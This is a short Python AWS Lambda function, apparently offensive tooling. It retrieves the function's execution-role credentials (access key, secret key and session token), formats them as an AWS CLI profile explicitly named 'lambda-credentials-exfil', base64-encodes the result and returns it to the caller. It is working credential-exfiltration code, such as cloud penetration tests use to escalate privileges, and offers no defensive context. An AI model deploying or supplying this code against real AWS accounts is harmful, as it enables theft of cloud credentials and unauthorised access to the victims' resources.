import boto3
import base64
def lambda_handler(event, context):
    session = boto3.Session()
    credentials = session.get_credentials()
    credentials = credentials.get_frozen_credentials()
    access_key = credentials.access_key
    secret_key = credentials.secret_key
    session_token = credentials.token

    lambdaProfileName = "lambda-credentials-exfil"
    echoFriendlyProfileName = "[%s]" % lambdaProfileName 
    echoFriendlyAccessKeyId = "aws_access_key_id = " + access_key
    echoFriendlySecretAccessKey = "aws_secret_access_key = " + secret_key
    echoFriendlySessionToken = "aws_session_token = " + session_token
    cli_profile = "\n%s\n%s\n%s\n%s" % (echoFriendlyProfileName,echoFriendlyAccessKeyId,echoFriendlySecretAccessKey,echoFriendlySessionToken)
    encoded_cli_profile = base64.b64encode(cli_profile.encode("ascii"))
    
    return (encoded_cli_profile)